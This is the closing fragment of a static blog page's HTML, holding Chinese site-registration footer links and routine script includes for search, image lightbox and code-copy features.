href="https://beian.miit.gov.cn/"> 蜀ICP备20009085号 |</a><a rel="nofollow" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=51010802000845"> 川公网安备51010802000845号</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/css/search.css?v=1.0.0"><script type="text/javascript" src="/js/search.js?v=1.0.0"></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+   search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>
